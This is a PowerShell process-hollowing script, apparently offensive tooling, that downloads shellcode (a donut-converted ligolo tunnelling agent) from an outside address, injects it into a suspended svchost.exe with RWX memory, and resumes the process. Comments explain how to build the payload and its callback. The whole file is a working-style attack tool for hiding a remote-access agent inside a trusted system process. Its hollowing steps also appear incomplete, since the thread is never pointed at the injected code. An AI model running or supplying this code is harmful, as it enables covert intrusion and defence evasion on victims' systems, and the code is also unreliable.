# Make sure to convert agent.exe of ligolo to shellcode: donut -f 1 -o agent.bin -a 2 -p "-connect your-server:11601 -ignore-cert" -i agent.exe
# Make sure you are running as x64 bit process before running.


# Import necessary Windows API functions
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class WinAPI {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CreateProcess(
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation
    );

    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern uint NtUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint ResumeThread(IntPtr hThread);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}

[StructLayout(LayoutKind.Sequential)]
public struct STARTUPINFO {
    public uint cb;
    public string lpReserved;
    public string lpDesktop;
    public string lpTitle;
    public uint dwX;
    public uint dwY;
    public uint dwXSize;
    public uint dwYSize;
    public uint dwXCountChars;
    public uint dwYCountChars;
    public uint dwFillAttribute;
    public uint dwFlags;
    public ushort wShowWindow;
    public ushort cbReserved2;
    public IntPtr lpReserved2;
    public IntPtr hStdInput;
    public IntPtr hStdOutput;
    public IntPtr hStdError;
}

[StructLayout(LayoutKind.Sequential)]
public struct PROCESS_INFORMATION {
    public IntPtr hProcess;
    public IntPtr hThread;
    public uint dwProcessId;
    public uint dwThreadId;
}
"@ -Language CSharp

# Constants
$CREATE_SUSPENDED = 0x4
$MEM_COMMIT = 0x1000
$MEM_RESERVE = 0x2000
$PAGE_EXECUTE_READWRITE = 0x40

# Load shellcode from remote
$url = "http://192.168.45.223/agent.bin" # Change accordingly
$shellcode = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content

# Initialize structures
$si = New-Object WinAPI+STARTUPINFO
$pi = New-Object WinAPI+PROCESS_INFORMATION
$si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf([WinAPI+STARTUPINFO])

# Start a suspended process
$targetExe = "C:\Windows\System32\svchost.exe"
$success = [WinAPI]::CreateProcess($targetExe, $null, [IntPtr]::Zero, [IntPtr]::Zero, $false, $CREATE_SUSPENDED, [IntPtr]::Zero, $null, [ref]$si, [ref]$pi)
if (-not $success) {
    Write-Error "Failed to create suspended process."
    exit
}

# Unmap the original executable
$unmapResult = [WinAPI]::NtUnmapViewOfSection($pi.hProcess, [IntPtr]::Zero)
if ($unmapResult -ne 0) {
    Write-Error "Failed to unmap the original section."
    [WinAPI]::CloseHandle($pi.hProcess)
    [WinAPI]::CloseHandle($pi.hThread)
    exit
}

# Allocate memory for the shellcode
$size = $shellcode.Length
$addr = [WinAPI]::VirtualAllocEx($pi.hProcess, [IntPtr]::Zero, [uint32]$size, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_EXECUTE_READWRITE)
if ($addr -eq [IntPtr]::Zero) {
    Write-Error "Failed to allocate memory in the target process."
    [WinAPI]::CloseHandle($pi.hProcess)
    [WinAPI]::CloseHandle($pi.hThread)
    exit
}

# Write the shellcode to the target process
$out = 0
$result = [WinAPI]::WriteProcessMemory($pi.hProcess, $addr, $shellcode, [uint32]$size, [ref]$out)
if (-not $result) {
    Write-Error "Failed to write shellcode to the target process."
    [WinAPI]::CloseHandle($pi.hProcess)
    [WinAPI]::CloseHandle($pi.hThread)
    exit
}

# Resume the suspended thread
[WinAPI]::ResumeThread($pi.hThread) | Out-Null

# Cleanup
[WinAPI]::CloseHandle($pi.hProcess)
[WinAPI]::CloseHandle($pi.hThread)

Write-Output "Process hollowing completed successfully!"
